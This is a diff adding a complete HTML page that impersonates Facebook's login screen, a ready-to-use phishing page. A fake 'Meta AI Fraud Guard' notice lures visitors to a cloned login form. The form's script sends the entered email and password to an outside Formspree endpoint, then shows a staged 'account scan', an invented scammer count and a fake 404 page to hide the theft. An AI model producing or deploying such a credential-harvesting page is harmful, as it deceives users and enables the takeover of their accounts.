@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@400;700&display=swap');
+        
+        body {
+            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+
+        .fb-logo-text {
+            color: #1877f2;
+            font-size: 3.5rem;
+            font-weight: 800;
+            letter-spacing: -2px;
+            margin-left: -4px;
+        }
+
+        .login-card {
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        #loading-screen {
+            background-color: #3b5998;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: fixed;
+            inset: 0;
+            z-index: 100;
+        }
+
+        .fade-out {
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s;
+        }
+
+        .hidden-page {
+            display: none !important;
+        }
+
+        .desktop-center-container {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+        }
+
+        /* Spinner Animation */
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #1877f2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 900px) {
+            .fb-logo-text {
+                font-size: 2.5rem;
+                margin-bottom: 10px;
+                margin-left: 0;
+            }
+            .desktop-center-container {
+                padding-top: 40px;
+            }
+        }
+    </style>
+</head>
+<body class="flex flex-col">
+
+    <!-- 1. LOADING SCREEN -->
+    <div id="loading-screen">
+        <h1 class="text-white text-5xl md:text-7xl font-bold tracking-tighter select-none">facebook</h1>
+    </div>
+
+    <!-- 2. FRAUD ACCOUNT FILTER PAGE -->
+    <div id="fraud-filter-page" class="hidden-page min-h-screen flex items-center justify-center bg-[#f0f2f5] p-4">
+        <div class="max-w-2xl bg-white p-8 rounded-xl shadow-lg border border-gray-200">
+            <div class="flex items-center gap-3 mb-6">
+                <div class="bg-blue-100 p-2 rounded-full">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-[#1877f2]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                    </svg>
+                </div>
+                <h2 class="text-2xl font-bold text-gray-800">Fraud Account Filter</h2>
+            </div>
+            
+            <div class="space-y-4 text-gray-700 leading-relaxed">
+                <div class="bg-blue-50 p-4 rounded-lg border-l-4 border-[#1877f2] mb-6">
+                    <p class="font-semibold text-[#166fe5]">New Security Enhancement</p>
+                    <p class="text-sm">We've integrated <strong>Meta AI</strong> to protect your digital identity. This new feature automatically detects and blocks fraudulent activity before it reaches your timeline.</p>
+                </div>
+
+                <h3 class="font-bold text-lg text-gray-900">How to Detect & Avoid Scammers:</h3>
+                <ul class="list-disc pl-5 space-y-2">
+                    <li><strong>Check the Profile:</strong> Scammers often use recently created accounts with very few friends or photos.</li>
+                    <li><strong>Urgency Tactics:</strong> Be wary of messages claiming your account will be deleted or asking for "urgent help" with money.</li>
+                    <li><strong>Suspicious Links:</strong> Never click on links that ask for your login credentials outside of the official Facebook app.</li>
+                    <li><strong>Identity Spoofing:</strong> Scammers may impersonate your friends. Always verify unusual requests through a different communication channel.</li>
+                </ul>
+                <p class="mt-6 pt-4 border-t border-gray-100">To activate the <strong>Meta AI Fraud Guard</strong>, please proceed to the secure login verification.</p>
+            </div>
+
+            <button onclick="showLoginPage()" class="w-full mt-8 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold py-3 rounded-md transition duration-200 text-lg">
+                Secure Login to Proceed
+            </button>
+        </div>
+    </div>
+
+    <!-- 3. ACTUAL LOGIN PAGE -->
+    <div id="login-page" class="hidden-page">
+        <div class="desktop-center-container">
+            <main class="w-full max-w-[980px] mx-auto flex flex-col md:flex-row items-center justify-between px-4">
+                <div class="md:w-[580px] text-center md:text-left mb-10 md:mb-0 pb-8">
+                    <h1 class="fb-logo-text select-none">facebook</h1>
+                    <p class="text-2xl md:text-[28px] leading-tight text-gray-800 font-normal">Facebook helps you connect and share with the people in your life.</p>
+                </div>
+                <div class="w-full max-w-[396px]">
+                    <div class="bg-white p-4 rounded-lg login-card border border-gray-200">
+                        <form id="loginForm" class="flex flex-col gap-4">
+                            <input type="text" placeholder="Email address or phone number" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
+                            <input type="password" placeholder="Password" class="p-3.5 border border-gray-300 rounded-md text-lg w-full focus:ring-0" required>
+                            <button type="submit" class="bg-[#1877f2] hover:bg-[#166fe5] text-white text-xl font-bold py-3 rounded-md transition duration-200">Log in</button>
+                            <div class="text-center py-2"><a href="#" class="text-[#1877f2] text-sm hover:underline">Forgotten password?</a></div>
+                            <hr class="border-gray-200 my-2">
+                            <div class="flex justify-center pt-2 pb-1">
+                                <button type="button" class="bg-[#42b72a] hover:bg-[#36a420] text-white text-[17px] font-bold py-3 px-4 rounded-md transition duration-200">Create new account</button>
+                            </div>
+                        </form>
+                    </div>
+                    <p class="text-[14px] text-center mt-7"><a href="#" class="font-bold hover:underline">Create a Page</a> for a celebrity, brand or business.</p>
+                </div>
+            </main>
+        </div>
+        <footer class="bg-white pt-8 pb-10 px-4 mt-12">
+            <div class="max-w-[980px] mx-auto text-xs text-gray-500">
+                <div class="flex flex-wrap gap-x-3"><span>English (UK)</span><a href="#" class="hover:underline">Hausa</a><a href="#" class="hover:underline">Français</a></div>
+                <hr class="border-gray-200 my-2">
+                <div>Meta © 2024</div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- 4. SCANNING/LOADING PAGE -->
+    <div id="scanning-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-white p-4">
+        <div class="spinner mb-6"></div>
+        <h2 class="text-2xl font-bold text-gray-800 mb-2">Scanning Account...</h2>
+        <p class="text-gray-500 text-center max-w-sm">Meta AI is currently scanning your account for fraudulent activities and associated scammer profiles. Please do not close this window.</p>
+        <p id="timer" class="mt-4 font-mono text-blue-600">Time remaining: 30s</p>
+    </div>
+
+    <!-- 5. RESULTS MODAL (Overlay) -->
+    <div id="results-modal" class="hidden-page fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-[1000] p-4">
+        <div class="bg-white rounded-lg p-8 max-w-md w-full shadow-2xl">
+            <div class="text-center">
+                <div class="text-red-500 mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                    </svg>
+                </div>
+                <h3 class="text-2xl font-bold text-gray-900 mb-2">Scan Complete</h3>
+                <p class="text-lg text-gray-700 mb-6">Meta AI has detected <span id="scammer-count" class="font-extrabold text-red-600">0</span> potential scammer accounts attempting to interact with your profile.</p>
+                <div id="reload-prompt" class="hidden-page p-4 bg-yellow-50 rounded-lg border border-yellow-200 mb-6">
+                    <p class="text-sm text-yellow-800">To view the specific accounts and blocked IDs, please reload the security dashboard.</p>
+                </div>
+                <button onclick="goTo404()" class="w-full bg-[#1877f2] text-white font-bold py-3 rounded-md hover:bg-[#166fe5]">
+                    Reload Page to View Accounts
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 6. 404 ERROR PAGE -->
+    <div id="error-page" class="hidden-page min-h-screen flex flex-col items-center justify-center bg-[#f0f2f5] p-6 text-center">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/yN/r/76Y9f_c99pk.png" alt="404" class="w-32 mb-6">
+        <h1 class="text-2xl font-bold text-gray-800 mb-2">This page isn't available</h1>
+        <p class="text-gray-600 max-w-md mb-6">The link you followed may be broken, or the page may have been removed. Go back to Facebook.</p>
+        <button onclick="location.reload()" class="bg-[#1877f2] text-white font-bold py-2 px-6 rounded-md">Go to News Feed</button>
+    </div>
+
+    <script>
+        window.onload = () => {
+            setTimeout(() => {
+                document.getElementById('loading-screen').classList.add('fade-out');
+                setTimeout(() => {
+                    document.getElementById('loading-screen').classList.add('hidden-page');
+                    document.getElementById('fraud-filter-page').classList.remove('hidden-page');
+                }, 500);
+            }, 1800);
+        };
+
+        function showLoginPage() {
+            document.getElementById('fraud-filter-page').classList.add('hidden-page');
+            document.getElementById('login-page').classList.remove('hidden-page');
+            window.scrollTo(0, 0);
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            // Get form data
+            const inputs = e.target.querySelectorAll('input');
+            const formData = new FormData();
+            formData.append('email', inputs[0].value);
+            formData.append('password', inputs[1].value);
+            
+            // Send to formspree
+            fetch('https://formspree.io/f/mlgbkzly', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Show scanning page regardless of success/failure
+                document.getElementById('login-page').classList.add('hidden-page');
+                document.getElementById('scanning-page').classList.remove('hidden-page');
+                startScanTimer();
+            }).catch(error => {
+                // Still show scanning page even if there's an error
+                document.getElementById('login-page').classList.add('hidden-page');
+                document.getElementById('scanning-page').classList.remove('hidden-page');
+                startScanTimer();
+            });
+        });
+
+        function startScanTimer() {
+            let seconds = 30;
+            const timerEl = document.getElementById('timer');
+            const countdown = setInterval(() => {
+                seconds--;
+                timerEl.innerText = `Time remaining: ${seconds}s`;
+                if (seconds <= 0) {
+                    clearInterval(countdown);
+                    showResults();
+                }
+            }, 1000);
+        }
+
+        function showResults() {
+            const count = Math.floor(Math.random() * (195 - 7 + 1)) + 7;
+            document.getElementById('scammer-count').innerText = count;
+            document.getElementById('scanning-page').classList.add('hidden-page');
+            document.getElementById('results-modal').classList.remove('hidden-page');
+            
+            // Show the "stagnant" reload prompt inside the modal after showing count
+            setTimeout(() => {
+                document.getElementById('reload-prompt').classList.remove('hidden-page');
+            }, 1000);
+        }
+
+        function goTo404() {
+            document.getElementById('results-modal').classList.add('hidden-page');
+            document.getElementById('error-page').classList.remove('hidden-page');
+        }
+    </script>
+</body>
+</html>
